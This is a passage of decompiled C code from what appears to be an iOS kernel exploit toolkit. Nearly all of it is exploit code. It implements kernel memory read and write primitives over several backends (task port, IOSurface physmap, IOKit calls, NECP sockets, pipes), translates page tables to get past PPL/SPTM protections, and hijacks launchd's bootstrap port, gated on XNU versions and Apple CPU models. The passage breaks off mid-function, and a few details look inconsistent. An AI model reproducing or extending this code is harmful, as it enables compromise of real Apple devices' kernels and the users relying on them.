__int64 __fastcall kwritebuf_last_arg_1(struct_krwCtx *krwCtx, __int64 address, const void *buf, mach_vm_size_t bufSize)
{
  return noppl_kwritebuf(krwCtx, address, buf, bufSize, 1);
}

//----- (000000000002A190) ----------------------------------------------------
unsigned __int64 __fastcall port_right_index_to_kaddr(struct_krwCtx *krwCtx, unsigned int a2)
{
  __int64 v2; // x19
  unsigned __int64 result; // x0
  __int64 v4; // x8
  __int64 v5; // x9
  int v6; // [xsp+Ch] [xbp-14h] BYREF

  v2 = a2;
  if ( !a2 )
    return 0;
  if ( (a2 & 0x80000000) != 0 )
  {
    v4 = krwCtx->gap_0x1F0;
    if ( v4 )
    {
      v5 = krwCtx->gap_0x1F8;
      if ( (uint32_t)v5 )
        return v4 + (a2 & 0x7FFFFFFF) * v5;
    }
    return 0;
  }
  result = kernel_va_base_resolver(krwCtx, 0, &v6);
  if ( result )
    result += v2 << v6;
  return result;
}

//----- (000000000002A200) ----------------------------------------------------
unsigned __int64 __fastcall decode_pte_to_physmap_addr(struct_krwCtx *krwCtx, unsigned __int64 a2, uint32_t *a3)
{
  bool v6; // cc
  int v7; // w9
  unsigned __int64 v8; // x8
  unsigned __int64 v9; // x11
  char v10; // w12
  __int64 v11; // x10
  __int64 v12; // x13
  __int64 v13; // x13
  __int64 v14; // x12
  __int64 v15; // x12
  __int64 v16; // x9
  unsigned __int64 v17; // x8

  if ( krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_CPU_A12_TO_A17_OR_SELF_TASK_PORT_MASK) )
  {
    if ( krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_CPU_HIGH_CORE_CLUSTER) || krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_CPU_A16_A17_MASK) )
    {
      v6 = krwCtx->xnuVersionPacked > XNU_VERSION_PACKED(8792, 80, 24, 1023, 1023);
      v7 = v6;
      v8 = 0xFFFF9FFFFFFFFFF0LL;
      if ( krwCtx->xnuVersionPacked > XNU_VERSION_PACKED(8792, 80, 24, 1023, 1023) )
        v8 = -32;
      v9 = 0xFFFFBFFFFFFFC000LL;
      if ( krwCtx->xnuVersionPacked > XNU_VERSION_PACKED(8792, 80, 24, 1023, 1023) )
      {
        v10 = 46;
      }
      else
      {
        v9 = 0xFFFF9FFFFFFFC000LL;
        v10 = 45;
      }
      v11 = 0x600000000000LL;
      v12 = 0x400000000000LL;
    }
    else
    {
      v6 = krwCtx->xnuVersionPacked > XNU_VERSION_PACKED(8792, 80, 24, 1023, 1023);
      v7 = v6;
      v8 = 0xFFFFFF9FFFFFFFF0LL;
      if ( krwCtx->xnuVersionPacked > XNU_VERSION_PACKED(8792, 80, 24, 1023, 1023) )
        v8 = -32;
      v9 = 0xFFFFFFBFFFFFC000LL;
      if ( krwCtx->xnuVersionPacked > XNU_VERSION_PACKED(8792, 80, 24, 1023, 1023) )
      {
        v10 = 38;
      }
      else
      {
        v9 = 0xFFFFFF9FFFFFC000LL;
        v10 = 37;
      }
      v11 = 0x6000000000LL;
      v12 = 0x4000000000LL;
    }
    if ( v6 )
      v11 = v12;
    v13 = 3;
    if ( v7 )
      v13 = 1;
    v14 = v13 & (a2 >> v10);
    if ( v14 )
    {
      v15 = v14 << (a2 & 0xF);
      if ( v7 )
        v16 = ((a2 & 0x10) | 0x20) << (a2 & 0xF);
      else
        LODWORD(v16) = v15;
    }
    else
    {
      LODWORD(v16) = ((uint32_t)a2 << 14) & 0xFFFC000;
      v8 = v9;
    }
    *a3 = v16;
    return (v8 & a2) | v11;
  }
  else
  {
    v17 = HIWORD(a2);
    if ( (a2 & 0x800000000000LL) != 0 )
      LODWORD(v17) = HIWORD(a2) << 14;
    *a3 = v17;
    return a2 | 0xFFFF800000000000LL;
  }
}

//----- (000000000002A360) ----------------------------------------------------
bool __fastcall kreadbuf_universal(struct_krwCtx *krwCtx, unsigned __int64 vaddr, mach_vm_size_t size, void *outBuf, __int64 a5)
{
  __int64 (__fastcall *v5)(struct_krwCtx *, unsigned __int64, void *, mach_vm_size_t, __int64); // x9
  int v6; // w0
  int v7; // w0

  v5 = *(__int64 (__fastcall **)(struct_krwCtx *, unsigned __int64, void *, mach_vm_size_t, __int64))&krwCtx->iogpuKreadFn;
  if ( v5 )
  {
    v6 = v5(krwCtx, vaddr, outBuf, size, a5);
    goto LABEL_3;
  }
  if ( krwCtx->threadForKernelRead + 1 >= 2 && *(uint64_t *)&krwCtx->threadStateKrwPhysAddr )
  {
    v6 = kreadbuf_via_dev_null_and_thread_state(krwCtx, vaddr, (__int64)outBuf, size, a5);
  }
  else if ( (unsigned int)(*(uint32_t *)&krwCtx->ioConnectPort + 1) >= 2
         && *(uint64_t *)&krwCtx->ioConnectMappedAddr
         && *(uint64_t *)&krwCtx->ioConnectMappedSize )
  {
    v6 = kreadbuf_via_IOConnectCallMethod(krwCtx, vaddr, (__int64)outBuf, size, a5);
  }
  else
  {
    if ( krwCtx->krw_pipe_0 == -1 || krwCtx->krw_pipe_1 == -1 )
      goto LABEL_22;
    if ( krwCtx->iosurfaceFd != -1 && krwCtx->gap_0x218 )
    {
      v6 = kreadbuf_via_dev_null_only(krwCtx, vaddr, (__int64)outBuf, size, a5);
      goto LABEL_3;
    }
    if ( krwCtx->pipeFd0 == -1 || krwCtx->pipeFd1 == -1 )
    {
LABEL_22:
      v7 = kreadbuf_via_tfp0(krwCtx->targetAndParentTaskPorts, vaddr, size, (unsigned int)krwCtx->vmMapSize, (__int64)outBuf, 0);
      return v7 == 0;
    }
    v6 = kreadbuf_via_dev_null_simple(krwCtx, vaddr, outBuf, size, a5);
  }
LABEL_3:
  if ( v6 )
    v7 = 5;
  else
    v7 = 0;
  return v7 == 0;
}

//----- (000000000002A480) ----------------------------------------------------
bool __fastcall kreadbuf_0(__int64 krwCtx, unsigned __int64 addr, mach_vm_size_t size, void *outBuf)
{
  return kreadbuf_universal(KRWCTX_FROM_UINTPTR(krwCtx), addr, size, outBuf, 0);
}

//----- (000000000002A488) ----------------------------------------------------
bool __fastcall noppl_kwritebuf(struct_krwCtx *krwCtx, unsigned __int64 a2, const void *a3, mach_vm_size_t a4, int a5)
{
  // struct_krwCtx *krwCtx; // x19
  __int64 (__fastcall *v5)(__int64, unsigned __int64, const void *, mach_vm_size_t, int); // x8
  int v6; // w0
  int v7; // w0

  TRACE_PORTS("noppl_kwritebuf enter ctx=%llx addr=%llx buf=%llx size=%llx a5=%d fn=%llx sptm_fd=%d sptm_ctx=%llx shm_port=%d shm_u=%llx shm_k=%llx necp_r=%d necp_w=%d pipe0=%d pipe1=%d iosurface_fd=%d necp=%llx tfp=%d chunk=%u\n",
              (unsigned long long)a1,
              (unsigned long long)a2,
              (unsigned long long)a3,
              (unsigned long long)a4,
              a5,
              (unsigned long long)krwCtx->iogpuKwriteFn,
              krwCtx->threadForKernelRead,
              (unsigned long long)krwCtx->threadStateKrwPhysAddr,
              krwCtx->ioConnectPort,
              (unsigned long long)krwCtx->ioConnectMappedAddr,
              (unsigned long long)krwCtx->ioConnectMappedSize,
              krwCtx->krw_pipe_0,
              krwCtx->krw_pipe_1,
              krwCtx->pipeFd0,
              krwCtx->pipeFd1,
              krwCtx->iosurfaceFd_size4,
              (unsigned long long)krwCtx->gap_0x218,
              krwCtx->targetVmPort,
              krwCtx->vmMapSize_size4);
  v5 = (__int64 (__fastcall *)(__int64, unsigned __int64, const void *, mach_vm_size_t, int))krwCtx->iogpuKwriteFn;
  if ( v5 )
  {
    v6 = v5(krwCtx, a2, a3, a4, a5);
    TRACE_PORTS("noppl_kwritebuf backend=custom raw=%x\n", v6);
    goto LABEL_3;
  }
  if ( (unsigned int)(krwCtx->threadForKernelRead + 1) >= 2 && krwCtx->threadStateKrwPhysAddr )
  {
    v6 = iosurface_physmap_kwrite(krwCtx, a2, (__int64)a3, a4, a5);
    TRACE_PORTS("noppl_kwritebuf backend=sptm raw=%x\n", v6);
  }
  else if ( (unsigned int)(krwCtx->ioConnectPort + 1) >= 2 && krwCtx->ioConnectMappedAddr && krwCtx->ioConnectMappedSize )
  {
    v6 = ioconnect_callmethod_write(krwCtx, a2, (__int64)a3, a4, a5);
    TRACE_PORTS("noppl_kwritebuf backend=ioconnect raw=%x\n", v6);
  }
  else
  {
    if ( krwCtx->krw_pipe_0 == -1 || krwCtx->krw_pipe_1 == -1 )
      goto LABEL_22;
    if ( krwCtx->iosurfaceFd_size4 != -1 && krwCtx->gap_0x218 )
    {
      v6 = necp_ioconnect_krw(krwCtx, a2, (__int64)a3, a4, a5);
      TRACE_PORTS("noppl_kwritebuf backend=necp raw=%x\n", v6);
      goto LABEL_3;
    }
    if ( krwCtx->pipeFd0 == -1 || krwCtx->pipeFd1 == -1 )
    {
LABEL_22:
      v7 = mach_vm_read_with_attr_chunks(krwCtx->targetVmPort, a2, (__int64)a3, a4, krwCtx->vmMapSize_size4);
      TRACE_PORTS("noppl_kwritebuf backend=tfp raw=%x ok=%d\n", v7, v7 == 0);
      return v7 == 0;
    }
    v6 = pipe_pair_krw(krwCtx, a2, a3, a4, a5);
    TRACE_PORTS("noppl_kwritebuf backend=pipe raw=%x\n", v6);
  }
LABEL_3:
  if ( v6 )
    v7 = 5;
  else
    v7 = 0;
  TRACE_PORTS("noppl_kwritebuf exit raw=%x ok=%d\n", v6, v7 == 0);
  return v7 == 0;
}

//----- (000000000002A56C) ----------------------------------------------------
bool __fastcall kwritebuf_last_0(struct_krwCtx *krwCtx, unsigned __int64 a2, const void *a3, mach_vm_size_t a4)
{
  return noppl_kwritebuf(krwCtx, a2, a3, a4, 0);
}

//----- (000000000002A574) ----------------------------------------------------
mach_vm_address_t __fastcall ppl_kwrite32(struct_krwCtx *krwCtx, mach_vm_address_t a2, int a3)
{
  unsigned __int64 v4; // x21
  struct_krwCtx *v5; // x19
  mach_vm_address_t result; // x0
  int newBytes; // [xsp+Ch] [xbp-24h] BYREF

  v4 = a2;
  v5 = krwCtx;
  newBytes = a3;
  if ( krwCtx->xnuVersionPacked < XNU_VERSION_PACKED(8019, 60, 40, 0, 0) )
  {
LABEL_8:
    return noppl_kwrite32(krwCtx, a2, a3);
  }
  if ( krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_CPU_A12_A13_A14_A15_A16_A17_MASK) )
    return ppl_kwritebuf(v5, v4, &newBytes, 4);
  result = remap_kaddr_through_physmap(v5, v4);
  if ( result )
  {
    a2 = result;
    goto LABEL_8;
  }
  return result;
}

//----- (000000000002A63C) ----------------------------------------------------
int kwrite64_dispatch(struct_krwCtx *krwCtx, mach_vm_address_t address, __int64 new_value)
{
    // Version threshold: XNU_VERSION_PACKED(8019, 60, 40, 0, 0)
    // = 0x001F530F02800000
    if (krwCtx->xnuVersionPacked >= XNU_VERSION_PACKED(8019, 60, 40, 0, 0)) {

        // New path: check for specific CPU/capability flag 0x05184001
        if (krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_CPU_A12_A13_A14_A15_A16_A17_MASK)) {
            // Tail call — PAC-authenticated branch to ppl_kwrite_physmap_checked
            return ppl_kwrite_physmap_checked(krwCtx, address, new_value);
        }

        // Translate address via remap_kaddr_through_physmap
        uint64_t translated = remap_kaddr_through_physmap(krwCtx, address);
        if (!translated)
            return 0;  // retab with no value set → returns 0

        // Use translated address, fall through to kwrite64_last_arg
        address = translated;
        // fall through

    }

    // Old path (and new path fallthrough):
    // ldrb w3, [x20, #0xc]  →  4th arg = krwCtx->byte_0x0c
    uint8_t arg3 = krwCtx->gap_0xC;

    // Tail call
    return kwrite64_last_arg(krwCtx, address, new_value, arg3);
}
// 2A6A4: variable 'vars8' is possibly undefined

//----- (000000000002A714) ----------------------------------------------------
unsigned __int64 __fastcall kwritebuf_universal(
        struct_krwCtx *krwCtx,
        unsigned __int64 vaddr,
        const void *newBytes,
        mach_vm_size_t length)
{
  unsigned __int64 vaddr_; // x22
  struct_krwCtx *krwCtx_; // x21
  unsigned __int64 result; // x0

  vaddr_ = vaddr;
  if ( krwCtx->xnuVersionPacked >= XNU_VERSION_PACKED(8019, 60, 40, 0, 0) )
  {
    if ( krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_CPU_A12_A13_A14_A15_A16_A17_MASK) )
    {
      return ppl_kwritebuf(krwCtx, vaddr_, (void *)newBytes, length);
    }
    result = remap_kaddr_through_physmap(krwCtx, vaddr_);
    if ( !result )
      return result;
    vaddr = result;
  }
  return noppl_kwritebuf(krwCtx, vaddr, newBytes, length, 1);
}
// 2A784: variable 'vars8' is possibly undefined

//----- (000000000002A7F4) ----------------------------------------------------
__int64 __fastcall mach_vm_read_with_attr_chunks(
        vm_map_t target_task,
        mach_vm_address_t address,
        __int64 a3,
        mach_vm_size_t size,
        unsigned int a5)
{
  unsigned int v5; // w21
  unsigned int v8; // w24
  __int64 v10; // x25
  unsigned int v11; // w26
  mach_msg_type_number_t v12; // w23
  __int64 result; // x0
  vm_machine_attribute_val_t value; // [xsp+Ch] [xbp-44h] BYREF

  v5 = size;
  if ( a5 )
    v8 = a5;
  else
    v8 = size;
  if ( (uint32_t)size )
  {
    v10 = 0;
    v11 = size;
    while ( 1 )
    {
      v12 = v11 >= v8 ? v8 : v11;
      result = mach_vm_write(target_task, v10 + address, v10 + a3, v12);
      if ( (uint32_t)result )
        break;
      v10 += v12;
      v11 -= v12;
      if ( !v11 )
        goto LABEL_11;
    }
  }
  else
  {
LABEL_11:
    value = 7;
    mach_vm_machine_attribute(target_task, address, v5, 1u, &value);
    return 0;
  }
  return result;
}

//----- (000000000002A8A4) ----------------------------------------------------
__int64 __fastcall pgtable_write_aligned(struct_krwCtx *krwCtx)
{
  __int64 v1; // x19
  kern_return_t v3; // w0
  __int64 v5; // x21
  unsigned __int64 v6; // x23
  __int128 v7; // q0
  mach_port_name_t iin_name; // w1
  kern_return_t attributes; // w0
  mach_port_name_t v10; // w2
  unsigned __int64 v11; // x0
  kern_return_t v12; // w0
  mach_msg_type_number_t port_info_outCnt; // [xsp+Ch] [xbp-B4h] BYREF
  integer_t port_info_out[4]; // [xsp+10h] [xbp-B0h] BYREF
  __int128 v15; // [xsp+20h] [xbp-A0h]
  __int128 v16; // [xsp+30h] [xbp-90h]
  __int128 v17; // [xsp+40h] [xbp-80h]
  int v18; // [xsp+50h] [xbp-70h]
  mach_msg_type_number_t tree_infoCnt; // [xsp+54h] [xbp-6Ch] BYREF
  ipc_info_tree_name_array_t tree_info; // [xsp+58h] [xbp-68h] BYREF
  mach_msg_type_number_t table_infoCnt; // [xsp+64h] [xbp-5Ch] BYREF
  ipc_info_name_array_t table_info; // [xsp+68h] [xbp-58h] BYREF
  ipc_info_space_t space_info; // [xsp+70h] [xbp-50h] BYREF
  mach_port_name_t v24; // [xsp+8Ch] [xbp-34h] BYREF

  if ( !krwCtx )
    return 708609;
  if ( bootstrap_port + 1 > 1 )
    return 0;
  v1 = 163843;
  v24 = 0;
  if ( krw_task_for_pid(krwCtx, 1, &v24) )
  {
    memset(&space_info, 0, sizeof(space_info));
    table_info = 0;
    table_infoCnt = 0;
    tree_info = 0;
    tree_infoCnt = 0;
    v3 = mach_port_space_info(v24, &space_info, &table_info, &table_infoCnt, &tree_info, &tree_infoCnt);
    if ( v3 )
    {
      v1 = v3 | 0x80000000;
    }
    else if ( table_infoCnt )
    {
      v5 = 0;
      v6 = 0;
      v7 = 0u;
      while ( 1 )
      {
        v18 = 0;
        v16 = v7;
        v17 = v7;
        *(__int128 *)port_info_out = v7;
        v15 = v7;
        port_info_outCnt = 17;
        if ( (table_info[v5].iin_type & 0x1F0000) != 0 )
        {
          iin_name = table_info[v5].iin_name;
          if ( iin_name + 1 >= 2 )
          {
            attributes = mach_port_get_attributes(v24, iin_name, 7, port_info_out, &port_info_outCnt);
            v7 = 0u;
            if ( !attributes && port_info_out[3] == 128 && (~BYTE4(v16) & 6) == 0 )
              break;
          }
        }
        ++v6;
        ++v5;
        if ( v6 >= table_infoCnt )
          goto LABEL_8;
      }
      v10 = table_info[v5].iin_name;
      if ( v10 + 1 >= 2 )
      {
        v11 = task_get_ipc_port(krwCtx, v24, v10);
        if ( v11 )
        {
          v1 = plist_elem_is_string_6(krwCtx, v11, &bootstrap_port);
          if ( !(uint32_t)v1 )
          {
            v12 = task_set_special_port(mach_task_self_, 4, bootstrap_port);
            if ( v12 )
              v1 = v12 | 0x80000000;
            else
              v1 = 0;
          }
        }
      }
    }
LABEL_8:
    if ( table_info && table_infoCnt )
      mach_vm_deallocate(mach_task_self_, (mach_vm_address_t)table_info, 28LL * table_infoCnt);
    if ( tree_info && tree_infoCnt )
      mach_vm_deallocate(mach_task_self_, (mach_vm_address_t)tree_info, 36LL * tree_infoCnt);
    mach_port_deallocate(mach_task_self_, v24);
  }
  return v1;
}

//----- (000000000002AABC) ----------------------------------------------------
__int64 __fastcall semaphore_timedwait_ns(__int64 a1, unsigned int a2)
{
  mach_timespec_t v2; // x1

  v2 = IDA_MACH_TIMESPEC((a2 / 0xF4240uLL) & 0x7FFFFFFFFLL
                       | ((unsigned __int64)((125 * (a2 % 0xF4240)) & 0x1FFFFFFF) << 35));
  if ( semaphore_timedwait(*(uint32_t *)(a1 + 612), v2) == 49 )
    return 0;
  else
    return 0xFFFFFFFFLL;
}

//----- (000000000002AB10) ----------------------------------------------------
__int64 vtable_trampoline_b()
{
  return 0LL;
}

//----- (000000000002AB18) ----------------------------------------------------
__int64 __fastcall necp_socket_fileport_setup(struct_krwCtx *krwCtx)
{
  __int64 v1; // x22
  int v3; // w0
  int v4; // w20
  int v5; // w21
  int v6; // w8
  int v7; // w21
  bool v8; // zf
  int v9; // w20
  __int64 v10; // x8
  int v12; // w19
  int v13; // w8
  struct sockaddr v14; // [xsp+0h] [xbp-50h] BYREF
  __int128 v15; // [xsp+10h] [xbp-40h]
  __int64 v16; // [xsp+20h] [xbp-30h] BYREF
  mach_port_t v17; // [xsp+2Ch] [xbp-24h]

  v1 = krwCtx->semaphoreHelperCtx;
  if ( !v1 )
    return 0;
  v17 = 0;
  v3 = socket(32, 2, 2);
  v4 = v3;
  if ( v3 < 0
    || (v14 = (struct sockaddr){0}, v15 = 0u, *(uint32_t *)&v14.sa_data[2] = 2, connect(v3, &v14, 0x20u))
    || (unsigned int)((__int64 (__cdecl *)())j__fileport_makeport)() )
  {
    v5 = errno;
    v6 = errno;
    if ( v5 < 0 )
      v6 = -v6;
    v7 = v6 | 0x40000000;
    goto LABEL_8;
  }
  v7 = get_task_bsd_info_kaddr(krwCtx, v17, &v16);
  if ( !v7 )
  {
    v7 = 163855;
    if ( kread_physmap_decorated(krwCtx, v16 + 16, (unsigned __int64 *)&v16) )
    {
      if ( !validate_kaddr_range(krwCtx, v16) )
        goto LABEL_40;
      if ( kread_physmap_decorated(krwCtx, v16 + 48, (unsigned __int64 *)&v16) )
      {
        if ( validate_kaddr_range(krwCtx, v16) )
        {
          v7 = 0;
          *(uint32_t *)(v1 + 16) = v4;
          *(uint64_t *)(v1 + 24) = v16;
          goto LABEL_8;
        }
LABEL_40:
        v7 = 163878;
      }
    }
  }
LABEL_8:
  if ( v17 + 1 >= 2 )
  {
    mach_port_deallocate(mach_task_self_, v17);
    v17 = 0;
  }
  if ( v7 )
    v8 = v4 == -1;
  else
    v8 = 1;
  if ( !v8 )
  {
    close(v4);
    *(uint32_t *)(v1 + 60) = v7;
LABEL_26:
    semaphore_signal(*(uint32_t *)(v1 + 12));
    return 0;
  }
  *(uint32_t *)(v1 + 60) = v7;
  if ( v7 )
    goto LABEL_26;
  v9 = 708609;
  while ( !(unsigned int)__semwait_signal() )
  {
    if ( *(uint8_t *)(v1 + 56) )
    {
      v9 = 0;
      goto LABEL_38;
    }
    v10 = *(uint64_t *)(v1 + 32);
    if ( !v10 || !*(uint64_t *)(v1 + 40) || *(uint64_t *)(v1 + 48) != 8 )
      goto LABEL_38;
    *(uint64_t *)&v14.sa_len = v10 - 48;
    if ( noppl_kwritebuf(krwCtx, *(uint64_t *)(v1 + 24) + 8LL, &v14, krwCtx->stride_0x168, 1) )
    {
      v16 = **(uint64_t **)(v1 + 40);
      if ( setsockopt(*(uint32_t *)(v1 + 16), 2, 16, &v16, 8u) )
        break;
      *(uint64_t *)&v14.sa_len = 0;
      if ( noppl_kwritebuf(krwCtx, *(uint64_t *)(v1 + 24) + 8LL, &v14, krwCtx->stride_0x168, 1) )
        continue;
    }
    v9 = 163856;
    goto LABEL_38;
  }
  v12 = errno;
  v13 = errno;
  if ( v12 < 0 )
    v13 = -v13;
  v9 = v13 | 0x40000000;
LABEL_38:
  *(uint32_t *)(v1 + 60) = v9;
  if ( !*(uint8_t *)(v1 + 56) )
    goto LABEL_26;
  return 0;
}

//----- (000000000002AD98) ----------------------------------------------------
__int64 __fastcall semaphore_wait_wrapper(semaphore_t a1)
{
  semaphore_wait(a1);
  return 0;
}

//----- (000000000002ADB4) ----------------------------------------------------
__int64 __fastcall semaphore_mem_acquire_thread(__int64 a1)
{
  semaphore_t v2; // w19
  pthread_mutex_t *v3; // x20
  __int64 v4; // x26
  char v5; // w25
  char v6; // w8
  unsigned int v7; // w27
  __int64 v8; // x22
  unsigned int v9; // w0
  unsigned int v10; // w23
  __int64 v11; // x8
  __int64 v12; // x24
  __int64 v13; // x23
  __int64 v14; // x28
  __int64 v15; // x8
  vm_address_t v16; // x8
  vm_size_t v17; // x24
  mem_entry_name_port_t v18; // w5
  vm_offset_t v19; // x6
  unsigned __int64 v20; // x9
  vm_size_t v21; // x23
  vm_address_t address; // [xsp+18h] [xbp-58h] BYREF

  v2 = *(uint32_t *)(a1 + 136);
  v3 = (pthread_mutex_t *)(a1 + 32);
  v4 = *(uint64_t *)(a1 + 104);
  if ( !v4 )
  {
    v5 = 0;
    v6 = 0;
    v7 = 0;
    v8 = *(uint64_t *)a1;
    while ( (v6 & 1) == 0 || !pthread_mutex_unlock(v3) )
    {
      if ( v7 )
        thread_switch(0, 2, 1u);
      if ( pthread_mutex_lock(v3) )
      {
        ++*(uint32_t *)(a1 + 120);
        goto LABEL_40;
      }
      if ( !*(uint64_t *)(a1 + 104) )
      {
        v9 = get_page_size();
        if ( v9 < *(uint32_t *)(a1 + 16) )
        {
          v10 = v9;
          v11 = *(uint64_t *)(*(uint64_t *)(a1 + 8) + 8LL * v9);
          if ( v11 )
          {
            v12 = *(uint64_t *)(v11 + *(unsigned int *)(a1 + 20));
            if ( validate_kaddr_range(v8, v12) )
            {
              if ( v10 == (unsigned int)get_page_size() )
              {
                v13 = v12 + *(unsigned int *)(a1 + 96);
                v14 = v13 & ~*(uint64_t *)(v8 + 392);
                v15 = *(uint64_t *)(a1 + 24);
                if ( v15 && v14 == v15 )
                  break;
                if ( !check_kaddr_in_physmap((struct_krwCtx *)v8, v12 + *(unsigned int *)(a1 + 96)) )
                {
LABEL_37:
                  *(uint64_t *)(a1 + 24) = v14;
                  break;
                }
                v16 = *(uint64_t *)(v8 + 144);
                if ( !v16 || (v17 = *(uint64_t *)(v8 + 152)) == 0 )
                {
                  address = 0;
                  v18 = *(uint32_t *)(v8 + 88);
                  if ( v18 + 1 < 2 )
                    goto LABEL_37;
                  v19 = *(uint64_t *)(v8 + 128);
                  if ( !v19 )
                    goto LABEL_37;
                  v17 = *(unsigned int *)(v8 + 136);
                  if ( !(uint32_t)v17 || vm_map(mach_task_self_, &address, v17, 0, 1, v18, v19, 0, 1, 1, 1u) )
                    goto LABEL_37;
                  v16 = address;
                  *(uint64_t *)(v8 + 144) = address;
                  *(uint64_t *)(v8 + 152) = v17;
                }
                v20 = 0;
                while ( !*(uint32_t *)(v16 + (unsigned int)(v20 + 32))
                     || *(uint64_t *)(v16 + (unsigned int)(v20 + 24)) != v14 )
                {
                  v20 += 48LL;
                  if ( v17 <= (unsigned int)v20 )
                    goto LABEL_37;
                }
                v21 = (*(uint64_t *)(v8 + 392) & v13)
                    + ((((*(uint64_t *)(v8 + 128) + *(unsigned int *)(v8 + 136) + vm_page_size - 1)
                       & -(__int64)vm_page_size) >> vm_page_shift)
                     + v20 / 0x30)
                    * vm_page_size;
                *(uint64_t *)(a1 + 104) = pthread_self();
                *(uint64_t *)(a1 + 112) = v21;
                v5 = 1;
              }
            }
          }
        }
      }
      if ( !*(uint64_t *)(a1 + 104) )
      {
        v6 = 1;
        if ( v7++ < 0xF )
          continue;
      }
      goto LABEL_3;
    }
    ++*(uint32_t *)(a1 + 120);
    goto LABEL_39;
  }
  v5 = 0;
LABEL_3:
  ++*(uint32_t *)(a1 + 120);
  if ( !v4 )
LABEL_39:
    pthread_mutex_unlock(v3);
LABEL_40:
  if ( (v5 & 1) != 0 )
    semaphore_wait(v2);
  return 0;
}

//----- (000000000002B03C) ----------------------------------------------------
__int64 __fastcall ulock_wait_loop(__int64 a1)
{
  unsigned int v2; // w21
  int v3; // w0

  __error();
  v2 = 0;
  *(uint8_t *)(a1 + 73) = 1;
  while ( 1 )
  {
    v3 = __ulock_wait(0x10001u, (void *)(a1 + 52), 0, *(uint32_t *)(a1 + 52));
    if ( !v3 )
    {
      ++*(uint64_t *)(a1 + 64);
      goto LABEL_10;
    }
    if ( v3 == -1 && errno == 4 && v2++ < 0x64 )
      continue;
    if ( errno != 14 )
      return 0;
LABEL_10:
    v2 = 0;
    if ( *(uint8_t *)(a1 + 72) )
      return 0;
  }
}

//----- (000000000002B0E8) ----------------------------------------------------
kern_return_t ioconnect_struct_method_kwrite(struct_krwCtx *krwCtx, uint64_t vaddr, uint64_t a3)
{
    // [x0+0x1d48] = pointer to IOKit connection info struct
    struct_IOKitConnInfo *connInfo = krwCtx->IOKitConnInfo; // [krwCtx+0x1d48]
    if (!connInfo)
        return 0xAD001;  // 708609: no connection

    // w26 = 0x20026 = base error code
    // w21 = connection port (dword at +0x70)
    mach_port_t ioPort = connInfo->ioPort;     // [connInfo+0x70]
    if ((uint32_t)(ioPort + 1) < 2)
        return 0x20026 - 0x1e;  // 0x20008 = 131080: invalid port

    uint64_t qword58 = connInfo->qword58;      // slot table base or similar
    if (!qword58)  return 0x20026;             // 131110
    uint64_t qword60 = connInfo->qword60;      // paddr target 1
    if (!qword60)  return 0x20026;
    uint64_t qword68 = connInfo->qword68;      // x27: some pointer/table
    if (!qword68)  return 0x20026;
    uint64_t qword50 = connInfo->qword50;      // x8: used in inputStruct
    if (!qword50)  return 0x20026 - 0x15;      // 0x20011 = 131089

    // --- Build inputStruct at [sp+0x138], size 0x100 ---
    // Zero entire 0x100-byte region first (the stur q0 block)
    uint8_t inputStruct[0x100];
    memset(inputStruct, 0, sizeof(inputStruct));
    *(uint32_t *)&inputStruct[0] = 0x80;  // str w10,[sp+0x138] = 128

    // Version-dependent field offsets within inputStruct
    // csel chain: if xnuMajorVersion > 0x225B: offsets +8 each
    uint64_t vm_pgsz = vm_page_size;           // x9 = vm_page_size global
    int off0, off1, off2, off3;
    if (krwCtx->xnuMajorVersion > 0x225B) {
        off0 = 0x30; off1 = 0x38; off2 = 0x40; off3 = 0x48;
    } else {
        off0 = 0x28; off1 = 0x30; off2 = 0x38; off3 = 0x40;
    }
    *(uint64_t *)&inputStruct[off0] = vm_pgsz;  // str x9,[x15,x10]
    *(uint64_t *)&inputStruct[off1] = qword50;  // str x8,[x15,x12]
    *(uint64_t *)&inputStruct[off2] = qword50;  // str x8,[x15,x13]
    *(uint64_t *)&inputStruct[off3] = vm_pgsz;  // str x9,[x15,x14]

    // outputStruct at [sp+0x30], size 0x100
    uint8_t outputStruct[0x100];
    memset(outputStruct, 0, sizeof(outputStruct));
    size_t outputStructCnt = 0x100;

    kern_return_t kr = IOConnectCallStructMethod(
        ioPort, 9,
        inputStruct, 0x100,
        outputStruct, &outputStructCnt);
    if (kr)
        return kr | 0x80000000;

    // Result field at outputStruct[0x1c] (sp+0x4c = sp+0x30+0x1c)
    uint32_t result_idx = *(uint32_t *)&outputStruct[0x1c];  // w28

    // Validate: result_idx must be in [1, 0x3ff]
    if ((uint32_t)(result_idx - 1) > 0x3FE)
        return 0x20026 - 0x15;  // 131089

    // kreadbuf: read one element from qword68 table at result_idx
    // stride = krwCtx->stride_0x168 (ldrsw = signed word)
    int32_t  stride  = krwCtx->stride_0x168;  // [krwCtx+0x168]
    uint64_t tbl_ptr = qword68 + (uint32_t)(stride * result_idx);
    uint64_t kaddr   = 0;

    if (!kreadbuf_universal(krwCtx, tbl_ptr, stride, &kaddr, 0))
        return 0x20026 - 0x17;  // 0x2000F = 131087

    // w26 updated: w26 = 0x20026 - 0x17 = 0x2000F (used as error below)

    // Translate/canonicalize kaddr
    kaddr = maybe_sptm_translate_kaddr(krwCtx, kaddr);

    if (!validate_kaddr_range(krwCtx, kaddr))
        return 0x20026;  // 131110

    // Get physical address of kaddr+0x10
    uint64_t paddr1 = kaddr_to_phys_v2(krwCtx, kaddr + 0x10, 0);
    if (!paddr1)
        return 0x20026;

    // Check if kaddr+0x10 and kaddr+0x78 are in same physical page
    // bics xzr, ((kaddr+0x10)^(kaddr+0x78)), ~krwCtx->page_mask
    // b.eq → same page (no second kaddr_to_phys_v2 needed)
    uint64_t paddr2;
    if (((kaddr + 0x10) ^ (kaddr + 0x78)) & ~krwCtx->pageMask) {
        // Different pages — get separate paddr for kaddr+0x78
        paddr2 = kaddr_to_phys_v2(krwCtx, kaddr + 0x78, 0);  // x1 used at +548
        if (!paddr2)
            return 0x20026;
        // paddr2 stored at [sp+0x0]
    } else {
        // Same page — kaddr+0x78 = paddr1 + 0x68
        paddr2 = paddr1 + 0x68;
        // stored at [sp+0x0]
    }

    // Write 0 to paddr1 (4 bytes) using appropriate physical write method
    uint32_t zero_val = 0;
    uint64_t version_threshold = XNU_VERSION_PACKED(10002, 60, 75, 0, 3);
    if (krwCtx->xnuVersionPacked >= version_threshold
